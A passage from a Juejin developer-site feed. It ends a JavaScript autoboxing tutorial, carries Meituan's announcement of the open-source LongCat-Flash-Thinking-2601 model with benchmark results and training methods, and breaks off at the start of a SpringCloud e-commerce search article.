<li><strong>性能</strong>: 自动装箱是一个隐式的、短暂的过程。虽然它方便了我们编程，但频繁地访问基本类型上的属性/方法可能会带来微小的性能开销（因为涉及对象的创建和销毁）。在绝大多数情况下，这种开销可以忽略不计。</li>
<li><strong>避免使用包装对象创建基本类型</strong>: 应该始终使用字面量方式创建基本类型（<code>let str = "hello"</code>），而不是构造函数方式（<code>let str = new String("hello")</code>）。后者创建的是对象，不仅性能较差，还可能导致一些意想不到的行为，尤其是在布尔判断时：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 危险示例</span>
<span class="hljs-keyword">const</span> falsyStrObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">""</span>); <span class="hljs-comment">// 空字符串对象</span>
<span class="hljs-keyword">if</span> (falsyStrObj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"This will print!"</span>); <span class="hljs-comment">// 即使字符串为空，对象本身是 truthy！</span>
}

<span class="hljs-comment">// 正确示例</span>
<span class="hljs-keyword">const</span> falsyStr = <span class="hljs-string">""</span>; <span class="hljs-comment">// 空字符串基本类型</span>
<span class="hljs-keyword">if</span> (falsyStr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"This will NOT print."</span>); <span class="hljs-comment">// 空字符串基本类型是 falsy</span>
}
</code></pre>
<h4 data-id="heading-6">六、总结</h4>
<p>通过本文，我们了解到：</p>
<ul>
<li>JavaScript 的基本数据类型（如 <code>string</code>, <code>number</code>, <code>boolean</code>）本身没有属性和方法。</li>
<li><code>String</code>, <code>Number</code>, <code>Boolean</code> 是对应的<strong>包装对象</strong>，是引用类型，拥有丰富的属性和方法。</li>
<li>当我们访问基本类型值的属性或方法时，JavaScript 引擎会执行<strong>自动装箱</strong>，临时将其转换为对应的包装对象进行操作，操作完毕后立即销毁临时对象。</li>
<li>这个机制让我们能够方便地在基本类型上使用各种方法，而无需手动进行类型转换。</li>
</ul>
<p>理解“自动装箱”这一核心概念，有助于我们更深刻地认识 JavaScript 的运行机制，写出更严谨、高效的代码。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[美团 LongCat-Flash-Thinking-2601 发布，工具调用能力登顶开源 SOTA！]]></title>    <link>https://juejin.cn/post/7596919439019868169</link>    <guid>https://juejin.cn/post/7596919439019868169</guid>    <pubDate>2026-01-20T01:43:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019868169" data-draft-id="7596966040921391110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="美团 LongCat-Flash-Thinking-2601 发布，工具调用能力登顶开源 SOTA！"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T01:43:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="美团技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3509296845313741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            美团 LongCat-Flash-Thinking-2601 发布，工具调用能力登顶开源 SOTA！
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ccb42d726640a7889ba1e64ae203e6~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="美团技术团队" class="title" data-v-d326b38e="">美团技术团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2026-01-20T01:43:04.000Z" title="Tue Jan 20 2026 01:43:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2026-01-20
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读7分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              美团小编 @美团
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近日，美团 LongCat 团队正式对外发布并开源 LongCat-Flash-Thinking-2601。作为已发布的 LongCat-Flash-Thinking 模型的升级版，LongCat-Flash-Thinking-2601 在 Agentic Search（智能体搜索）、Agentic Tool Use（智能体工具调用）、TIR（工具交互推理）等核心评测基准上，均达到开源模型 SOTA 水平。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b2999574354499e91105f2768f6024a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=4T7JbhzCpG7%2FvS1LiL3i4hpkteY%3D" alt="" loading="lazy"/></p>
<p>该模型尤其在工具调用上表现出卓越的泛化能力，在依赖工具调用的随机复杂任务中性能超越了 Claude，可大幅度降低真实场景下新工具的适配训练成本；同时它是首个完整开源并支持在线免费体验「重思考模式」的模型，同时启动 8 个大脑飞速运转，确保思考周全、决策可靠。</p>
<p>目前该功能已经可以在 <a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.ai" target="_blank" title="https://longcat.ai" ref="nofollow noopener noreferrer">longcat.ai</a> 网站免费体验（仅选择深度思考功能时会触发重思考模式）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d2b11c782fc4ac6b8113f53c7822529~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=iYjVRDw0F3QxwP%2BUUEhfX130UFk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">01 创新的「重思考」模式：让模型学会“深思熟虑”</h2>
<p>全新升级的「重思考」模式，让模型学会了“深思熟虑”再行动，遇到高难度问题时，模型会把思考过程拆成并行思考和总结归纳两步来做：</p>
<p>并行思考阶段，模型会同时独立梳理出好几条推理路径，就跟人面对难题时会琢磨不同解法一个道理，还会特意保证思路的多样性，生怕漏掉最优解；</p>
<p>总结归纳阶段，对多条路径进行梳理、优化与合成，并将优化结果重新输入，形成闭环迭代推理，推动思考持续深化。</p>
<p>除此之外，我们还专门设计了额外的强化学习环节，针对性打磨模型的总结归纳能力，让 LongCat-Flash-Thinking-2601 真正实现“想清楚再行动”。</p>
<h2 data-id="heading-1">02 智能体工具调用能力登顶开源 SOTA</h2>
<p>经过全面严谨的评估显示，LongCat-Flash-Thinking-2601 模型在编程、数学推理、智能体工具调用、智能体搜索维度表现全面领先：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98cec7057fb94bb998c63782187feb91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=RXG4VeL5fiqwRaC9YQfhX9EbT3g%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>编程能力</strong>：LongCat-Flash-Thinking-2601 在 LCB 评测中取得 82.8 分，OIBench EN 评测获 47.7 分，成绩处于同类模型第一梯队，展现出扎实的代码基础能力。</li>
<li><strong>数学推理能力</strong>：在开启重思考模式后表现突出，LongCat-Flash-Thinking-2601 在 AIME-25 评测中获 100.0 分（满分），IMO-AnswerBench 中以 86.8 分达到当前 SOTA。</li>
<li><strong>智能体工具调用能力</strong>：在 τ²-Bench 评测中拿到 88.2 分，VitaBench 评测中获得 29.3 分，均获得开源 SOTA 水平，在多领域工具调用场景下表现优异，适配实际应用需求。</li>
<li><strong>智能体搜索能力</strong>：在 BrowseComp 任务中取得 73.1 分（全模型最优），RW Search 评测获 79.5 分，LongCat-Flash-Thinking-2601 具备强劲的信息检索与场景适配能力，达到开源领先水平。</li>
</ul>
<p>同时，<strong>为了更好的测试智能体模型的泛化能力，我们提出了一种全新的评测方法</strong>——通过构建一套自动化任务合成流程，支持用户基于给定关键词，为任意场景随机生成复杂任务。每个生成的任务都配备了对应的工具集与可执行环境。由于这类环境中的工具配置具有高度随机性，我们通过评估模型在该类环境中的性能表现，来衡量其泛化能力。实验结果表明，LongCat-Flash-Thinking-2601 在绝大多数任务中保持领先性能，印证了其在智能体场景下强大的泛化能力。</p>
<h2 data-id="heading-2">03 核心技术突破：既能“打硬仗”也能“抗干扰”</h2>
<h3 data-id="heading-3">3.1 环境扩展与多环境强化学习 ：从“靶场”到“实战”</h3>
<p>传统智能体大多只在几个简单模拟环境里训练，就像士兵只练过靶场，到了真实“战场”就掉链子。而基于“环境扩展+多环境强化学习”核心技术，为模型打造了多样化的“高强度练兵场”，构建了多套高质量训练环境，每套集成 60 余种工具并形成密集依赖关系图谱与复杂联动，支撑起高度复杂的任务场景。实验证明，<strong>训练环境越丰富，模型在未知场景中的泛化能力越强</strong>。得益于这套方案，LongCat-Flash-Thinking-2601 在智能体搜索、智能体工具调用等核心基准测试中稳居前列。尤其在复杂随机的分布外任务中性能优于 Claude。</p>
<p>同时我们针对性扩展 <strong>自研强化学习基础设施（DORA）</strong>，在保留原有高效异步训练特性的基础上实现大规模多环境智能体的稳定并行训练，通过均衡搭配多环境任务、按难度与训练进度智能分配算力，最大化提升训练效率与资源利用率，筑牢能力根基。此外，我们还从复杂度、多样性双维度严控训练任务，配套专属数据库及优化方案，杜绝模型“偏科”与训练漏洞，让这套全流程方案持续赋能模型，稳居智能体能力第一梯队。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d6d5ec68f314521803563c3dd7e14c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=x4N2SgZXBYDydXTlT4dhJ7JrzkE%3D" alt="稳定上涨的多环境混合强化学习训练曲线" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74b20c82e22f4af9b033f490e6998148~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=vjUjafKNZd9%2FKhvb4KbrYjk64IQ%3D" alt="多环境强化学习训练下不同 OOD 测试集上的 RL Scaling 表现" loading="lazy"/></p>
<h3 data-id="heading-4">3.2 噪声环境下的稳健训练：让智能体更“抗造”</h3>
<p>现实世界的智能体环境充满不确定性，API 调用失败、返回异常信息、观测数据不完整等“噪声”问题，极易导致模型决策失误。为此，<strong>我们在训练数据的过程中主动注入多类噪声</strong>，模拟 API 的调用失败、返回错误信息、数据缺失等场景，并用课程学习（Curriculum Learning）的方式循序渐进去做模型的训练，在训练过程中逐步增加噪声的类型与强度——如果类比成教小孩骑车，我们首先在平坦路面做练习，等技能成熟后再逐步增加路面的复杂度。</p>
<p>可以看到，带噪声环境下未经过稳健训练的模型的表现会出现大幅衰减，Claude 也无法适应全部的噪声类型。而经过这套系统化的抗干扰训练，LongCat-Flash-Thinking-2601（Training w/ Noise 组）拥有了极强的环境适应能力，哪怕在复杂、不理想的场景中，也能稳定发挥、高效完成任务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58755c4cbdea4781826364cdbbf874cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=CfkI9n%2FvqIwmiPNVOMFWt7zVSoE%3D" alt="带噪声 / 无噪声评测集下的模型表现对比" loading="lazy"/></p>
<h2 data-id="heading-5">开源与部署：低门槛接入，加速智能体应用落地</h2>
<p>为降低开发者使用门槛，美团 LongCat 团队同步开放模型权重、推理代码与在线体验能力，支持从快速试用至深度开发的全流程需求：</p>
<p><strong>开源平台</strong></p>
<ul>
<li><strong>GitHub</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://github.com/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">github.com/meituan-lon…</a></li>
<li><strong>Hugging Face</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://huggingface.co/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">huggingface.co/meituan-lon…</a></li>
<li><strong>ModelScope</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.modelscope.cn%2Fmodels%2Fmeituan-longcat%2FLongCat-Flash-Thinking-2601" target="_blank" title="https://www.modelscope.cn/models/meituan-longcat/LongCat-Flash-Thinking-2601" ref="nofollow noopener noreferrer">www.modelscope.cn/models/meit…</a></li>
</ul>
<p><strong>在线体验与调用</strong></p>
<ul>
<li><strong>官网</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.ai" target="_blank" title="https://longcat.ai" ref="nofollow noopener noreferrer">longcat.ai</a></li>
<li><strong>API 开放平台</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.chat%2Fplatform%2Fusage" target="_blank" title="https://longcat.chat/platform/usage" ref="nofollow noopener noreferrer">longcat.chat/platform/us…</a></li>
</ul>
<p>欢迎开发者下载、部署并体验 LongCat-Flash-Thinking-2601，同时也欢迎您在 LongCat API 开放平台申请免费调用额度。如果您在智能体开发、大模型推理优化等领域有合作想法或反馈，我们期待与您交流。</p>
<p>| 关注「美团技术团队」微信公众号，在公众号菜单栏对话框回复【2024年货】、【2023年货】、【2022年货】、【2021年货】、【2020年货】、【2019年货】、【2018年货】、【2017年货】等关键词，可查看美团技术团队历年技术文章合集。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06862b52013c4c1bbb99d38d901d3988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=jD8rljAd6d2a5ky3z0sRw4nqB4s%3D" alt="" loading="lazy"/></p>
<p>| 本文系美团技术团队出品，著作权归属美团。欢迎出于分享和交流等非商业目的转载或使用本文内容，敬请注明“内容转载自美团技术团队”。本文未经许可，不得进行商业性转载或者使用。任何商用行为，请发送邮件至 <a href="https://link.juejin.cn?target=mailto%3Atech%40meituan.com" target="_blank" title="mailto:tech@meituan.com" ref="nofollow noopener noreferrer">tech@meituan.com</a> 申请授权。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于SpringCloud + ElasticSearch + Redis + RabbitMQ 构建高性能电商搜索和个性化推荐系统]]></title>    <link>https://juejin.cn/post/7596906923892064266</link>    <guid>https://juejin.cn/post/7596906923892064266</guid>    <pubDate>2026-01-19T11:47:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892064266" data-draft-id="7596845113281003529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于SpringCloud + ElasticSearch + Redis + RabbitMQ 构建高性能电商搜索和个性化推荐系统"/> <meta itemprop="keywords" content="后端,RabbitMQ"/> <meta itemprop="datePublished" content="2026-01-19T11:47:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三水不滴"/> <meta itemprop="url" content="https://juejin.cn/user/283045639753100"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于SpringCloud + ElasticSearch + Redis + RabbitMQ 构建高性能电商搜索和个性化推荐系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/283045639753100/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三水不滴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:47:46.000Z" title="Mon Jan 19 2026 11:47:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 